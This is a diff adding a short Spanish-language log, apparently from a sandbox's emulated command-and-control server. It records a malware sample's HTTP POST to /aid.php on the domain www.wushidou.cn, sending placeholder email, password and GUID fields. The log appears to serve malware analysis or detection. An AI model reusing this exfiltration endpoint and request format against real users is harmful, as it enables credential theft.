@@ -1,0 +1,5 @@
+[11:32:21] Servidor C2 HTTP escuchando en 113.10.174.167:80 para www.wushidou.cn
+[11:32:21] C2 HTTP desde 10.28.8.10:41802: 'POST /aid.php HTTP/1.1'
+[11:32:21] C2 Host='www.wushidou.cn' Content-Type='application/x-www-form-urlencoded' body='id=victim%40example.com&name=victim%40example.com&pass=Password123&guid=00000000-1111-2222-3333-444444444444'
+[11:32:31] Parada solicitada, cerrando servidores...
+[11:32:32] Servidor detenido.
